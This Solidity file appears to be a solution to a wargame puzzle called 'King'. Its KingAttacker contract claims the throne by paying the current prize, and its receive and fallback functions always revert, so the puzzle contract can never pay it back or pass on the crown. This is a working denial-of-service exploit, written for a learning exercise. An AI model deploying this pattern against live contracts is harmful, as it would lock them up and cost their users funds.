// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import {King} from "../../puzzles/9/King.sol";

contract KingAttacker {
    error MSG_VALUE_LESS_THAN_PRICE();

    receive() external payable {
        revert();
    }

    fallback() external payable {
        revert();
    }

    function attack(address kingAddress) external payable {
        King king = King(payable(kingAddress));
        uint256 currentPrice = king.prize();
        if(msg.value < currentPrice){
            revert MSG_VALUE_LESS_THAN_PRICE();
        }
        (bool success, ) = address(king).call{value: msg.value}("");
        if(!success){
            revert();
        }
    }
}
